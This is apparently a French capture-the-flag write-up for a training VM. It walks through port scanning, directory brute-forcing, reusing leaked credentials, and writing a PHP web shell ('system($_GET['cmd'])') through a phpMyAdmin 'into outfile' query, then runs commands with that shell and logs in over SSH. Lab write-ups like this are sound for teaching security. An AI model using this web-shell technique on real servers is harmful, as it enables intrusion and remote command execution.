# Branch #0

## Reconnaissance

Nous commencons par scanner les ports ouverts de la VM avec `nmap`.

```
$ nmap -p- 192.168.56.101
...
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
...
```

Il existe un service **HTTP** et **HTTPS**.

En nous rendant sur l'URL `http://192.168.56.101`, nous constatons la presence d'une page web tres simpliste. La page ne presente aucune surface d'attaque.

Nous utilisons `DirBuster` pour bruteforce les URLs disponible.

```
$ dirb http://192.168.56.101
...
URL FOUND: 4
...

$ dirb https://192.168.56.101
...
---- Scanning URL: https://192.168.56.101/ ----
+ https://192.168.56.101/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.56.101/forum/
==> DIRECTORY: https://192.168.56.101/phpmyadmin/
+ https://192.168.56.101/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.56.101/webmail/
...
URL FOUND: 36
...
```

## Forum

En navigant sur le forum, nous remarquons un thread intitule **Probleme login ?** comportant des logs de connexion.

```
...

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]

Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

...
```

L'extrait presente ci-dessus montre une erreur de connexion, suivi d'un connexion reussie.

Il pourrait s'agir d'une faute de parcours d'un utilisateur qui a d'abord saisi son mot de passe dans le champ `login` et a essuye un echec avant de s'y reprendre.

Nous avons donc les identifiants suivants:

`lmezard : !q\]Ej?*5K5cy*AJ`

Nous pouvons donc utilise ces identifiants pour etablir un connexion sur le forum en tant que **lmezard**.

En accedant a la page de profil de l'utilisateur, nous obtenons le mail:

`laurie@borntosec.net`

Nous pouvons desormais nous connecter a SquirrelMail via l'URL `https://192.168.56.101/webmail/` grace aux identifiants suivants:

`laurie@borntosec.net : !q\]Ej?*5K5cy*AJ`

## WebMail

Deux mails se trouvent dans la boite de reception de Laurie.

L'un des deux se nomme **DB Access** et contient le message suivant:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

Nous pouvons desormais nous connecter a PhpMyAdmin via l'URL `https://192.168.56.101/phpmyadmin/` grace aux identifiants suivants:

`root : Fg-'kKXBj87E:aJ$`

## PhpMyAdmin

Nous allons nous rendre sur l'onglet `SQL` pour injecter une porte derobee dans le serveur.

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
```

Ainsi, en nous rendant sur l'URL `https://192.168.56.101/forum/templates_c/backdoor.php` nous pouvons saisir des commandes shell dans le navigateur, en les passant dans le parametre 'cmd'.

```
https://192.168.56.101/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password

lmezard:G!@M6f4Eatau{sF"
```

Nous obtenons les identifiants suivants:

`lmezard : G!@M6f4Eatau{sF"`

## Connexion a la VM

Nous accedons a la VM (directement, pas en SSH) grace aux identifiants precedemment trouves.

_**NOTE:** Ces identifiants nous permettent egalement d'acceder au serveur ftp pour telecharger le binaire._

Une enigme avec un binaire nous attend pour la suite du jeu de piste.

```
password : .......wnage

les 7 autres lettres devant un return dans le fichier fun : p

t(23) I(86) e(371) r(406) a(429) h(490) p(617)

tIerahpwnage
hpeaIrwnage

I //6
h //38
e //57
a //116
r //369
t //522
p //737

Iheartpwnage
```

Nous finissons par trouver:
`Iheartpwnage`

Ce qui, une fois hashe en SHA256, nous donne:
`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## Connexion SSH

Nous etablissons la connexion SSH de la facon suivante:

`ssh laurie@192.168.56.101`

Avec le mot de passe:

`330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
